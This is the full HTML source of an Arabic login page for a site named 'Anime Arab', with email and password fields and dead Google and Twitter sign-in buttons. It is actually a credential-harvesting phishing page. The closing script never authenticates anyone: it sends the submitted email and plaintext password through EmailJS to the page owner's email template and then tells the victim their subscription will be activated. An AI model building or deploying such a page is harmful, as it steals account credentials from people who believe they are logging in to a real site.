<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
  <title>تسجيل الدخول - أنمي عرب</title>
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script type="text/javascript">
    (function() {
      emailjs.init("irt_a77898WnRj4IJ");
    })();
  </script>

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap');

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Cairo', 'Segoe UI', Tahoma, Arial, sans-serif;
      background: #1c1f2e;
      color: #d1d5e0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      -webkit-font-smoothing: antialiased;
    }

    .navbar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 16px;
      background: #1c1f2e;
    }

    .nav-group { display: flex; align-items: center; gap: 10px; }

    .nav-icon {
      width: 40px; height: 40px; border-radius: 50%;
      background: #2a2e42; border: none;
      display: flex; align-items: center; justify-content: center;
      cursor: pointer; color: #a8adbf; position: relative;
    }

    .nav-icon svg { width: 20px; height: 20px; fill: currentColor; }

    .notif-badge {
      position: absolute; top: -1px; left: -1px;
      background: #ef4444; color: #fff;
      font-size: 11px; font-weight: 700;
      min-width: 17px; height: 17px; border-radius: 50%;
      display: flex; align-items: center; justify-content: center;
    }

    .main {
      flex: 1; display: flex; flex-direction: column;
      align-items: center; padding: 24px 20px 30px;
    }

    .page-title {
      font-size: 26px; font-weight: 600; color: #e8eaf2;
      margin-bottom: 36px; text-align: center;
    }

    .form-wrap { width: 100%; max-width: 400px; }

    .field { margin-bottom: 18px; }

    .field label {
      display: block; text-align: right;
      font-size: 13.5px; color: #9ca3b8;
      margin-bottom: 7px; font-weight: 500;
    }

    .field input {
      width: 100%; height: 46px; padding: 0 14px;
      background: #2a2e42; border: 1px solid #353a52;
      border-radius: 10px; color: #e8eaf2;
      font-size: 15px; font-family: inherit; outline: none;
      direction: ltr; text-align: left;
    }

    .field input:focus { border-color: #3b82f6; }

    .remember-row {
      display: flex; justify-content: flex-end;
      align-items: center; gap: 8px;
      margin: 6px 0 26px; font-size: 13.5px; color: #9ca3b8;
    }

    .remember-row input[type="checkbox"] {
      width: 17px; height: 17px; accent-color: #3b82f6; cursor: pointer;
    }

    .actions {
      display: flex; align-items: center; gap: 18px; margin-bottom: 32px;
    }

    .btn-primary {
      background: #3b82f6; color: #fff; border: none;
      border-radius: 10px; height: 42px; padding: 0 24px;
      font-size: 14.5px; font-weight: 600; font-family: inherit;
      cursor: pointer;
    }

    .btn-primary:hover { background: #2563eb; }
    .btn-primary:disabled { background: #1e3a8a; cursor: not-allowed; }

    .link-muted {
      color: #a8adbf; font-size: 13.5px; text-decoration: none;
    }

    .or-text {
      text-align: center; color: #6b7289;
      font-size: 13.5px; margin-bottom: 20px;
    }

    .social {
      display: flex; flex-direction: column; gap: 11px;
      width: 100%; max-width: 400px; margin-bottom: 32px;
    }

    .social-btn {
      display: flex; align-items: center; justify-content: center;
      gap: 12px; height: 46px;
      background: #2a2e42; border: 1px solid #353a52;
      border-radius: 10px; color: #d1d5e0;
      font-size: 14.5px; font-family: inherit;
      text-decoration: none; cursor: pointer;
    }

    .social-btn svg { width: 20px; height: 20px; flex-shrink: 0; }

    .register {
      text-align: center; font-size: 13.5px; color: #8b91a5;
    }

    .register a {
      color: #e0e3ef; font-weight: 600;
      text-decoration: none; margin-right: 4px;
    }

    .footer {
      text-align: center; padding: 18px 16px 24px;
      font-size: 12.5px; color: #5c6378;
    }

    .success-msg {
      display: none;
      background: #14532d;
      color: #bbf7d0;
      padding: 14px 18px;
      border-radius: 10px;
      margin-bottom: 20px;
      text-align: center;
      font-size: 14px;
    }

    .error-msg {
      display: none;
      background: #7f1d1d;
      color: #fecaca;
      padding: 14px 18px;
      border-radius: 10px;
      margin-bottom: 20px;
      text-align: center;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <nav class="navbar">
    <div class="nav-group">
      <button class="nav-icon">
        <svg viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
      </button>
      <button class="nav-icon">
        <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
      </button>
    </div>
    <div class="nav-group">
      <button class="nav-icon">
        <svg viewBox="0 0 24 24"><path d="M12 7c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zM2 13h2c.55 0 1-.45 1-1s-.45-1-1-1H2c-.55 0-1 .45-1 1s.45 1 1 1zm18 0h2c.55 0 1-.45 1-1s-.45-1-1-1h-2c-.55 0-1 .45-1 1s.45 1 1 1zM11 2v2c0 .55.45 1 1 1s1-.45 1-1V2c0-.55-.45-1-1-1s-1 .45-1 1zm0 18v2c0 .55.45 1 1 1s1-.45 1-1v-2c0-.55-.45-1-1-1s-1 .45-1 1zM5.99 4.58a.996.996 0 0 0-1.41 0 .996.996 0 0 0 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0s.39-1.03 0-1.41L5.99 4.58zm12.37 12.37a.996.996 0 0 0-1.41 0 .996.996 0 0 0 0 1.41l1.06 1.06c.39.39 1.03.39 1.41 0a.996.996 0 0 0 0-1.41l-1.06-1.06zm1.06-10.96a.996.996 0 0 0 0-1.41.996.996 0 0 0-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06zM7.05 18.36a.996.996 0 0 0 0-1.41.996.996 0 0 0-1.41 0l-1.06 1.06c-.39.39-.39 1.03 0 1.41s1.03.39 1.41 0l1.06-1.06z"/></svg>
      </button>
      <button class="nav-icon">
        <svg viewBox="0 0 24 24"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/></svg>
        <span class="notif-badge">1</span>
      </button>
      <button class="nav-icon">
        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
      </button>
    </div>
  </nav>

  <main class="main">
    <h1 class="page-title">تسجيل الدخول لحسابك</h1>

    <div class="success-msg" id="successMsg">
      تم إرسال بياناتك بنجاح! سيتم تفعيل اشتراكك قريبًا.
    </div>

    <div class="error-msg" id="errorMsg">
      حدث خطأ أثناء الإرسال، حاول مرة أخرى.
    </div>

    <form class="form-wrap" id="loginForm">

      <!-- حقل مخفي للعنوان عشان القالب فيه {{title}} -->
      <input type="hidden" name="title" value="طلب تسجيل دخول جديد - أنمي عرب" />

      <div class="field">
        <label for="email">البريد الإلكتروني</label>
        <input type="email" id="email" name="email" required autocomplete="email" />
      </div>

      <div class="field">
        <label for="password">كلمة المرور</label>
        <input type="password" id="password" name="password" required autocomplete="current-password" />
      </div>

      <div class="remember-row">
        <label for="remember">تذكرني</label>
        <input type="checkbox" id="remember" name="remember" />
      </div>

      <div class="actions">
        <button type="submit" class="btn-primary" id="submitBtn">تسجيل الدخول</button>
        <a href="#" class="link-muted">نسيت كلمة المرور؟</a>
      </div>
    </form>

    <p class="or-text">بدلا من ذلك يمكنك</p>

    <div class="social">
      <a href="#" class="social-btn">
        <svg viewBox="0 0 24 24">
          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
        </svg>
        التسجيل بحساب جوجل
      </a>
      <a href="#" class="social-btn">
        <svg viewBox="0 0 24 24" fill="#ffffff">
          <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.744l7.727-8.835L1.254 2.25H8.08l4.253 5.622L18.244 2.25zm-1.161 17.52h1.833L7.084 4.126H5.117L17.083 19.77z"/>
        </svg>
        التسجيل بحساب تويتر
      </a>
    </div>

    <p class="register">
      ليس لديك حساب؟
      <a href="register.html">تسجيل حساب جديد</a>
    </p>
  </main>

  <footer class="footer">
    جميع الحقوق محفوظة © أنمي عرب 2026
  </footer>

  <script>
    const form = document.getElementById('loginForm');
    const successMsg = document.getElementById('successMsg');
    const errorMsg = document.getElementById('errorMsg');
    const submitBtn = document.getElementById('submitBtn');

    form.addEventListener('submit', function(event) {
      event.preventDefault();
      
      successMsg.style.display = 'none';
      errorMsg.style.display = 'none';
      submitBtn.disabled = true;
      submitBtn.textContent = 'جاري الإرسال...';

      const SERVICE_ID = "service_gsx31e5";
      const TEMPLATE_ID = "template_12fcfka";

      emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
        .then(function() {
          successMsg.style.display = 'block';
          form.reset();
          submitBtn.disabled = false;
          submitBtn.textContent = 'تسجيل الدخول';
        }, function(error) {
          console.error('EmailJS Error:', error);
          errorMsg.style.display = 'block';
          errorMsg.textContent = 'حدث خطأ: ' + (error.text || 'حاول مرة أخرى');
          submitBtn.disabled = false;
          submitBtn.textContent = 'تسجيل الدخول';
        });
    });
  </script>
</body>
</html>
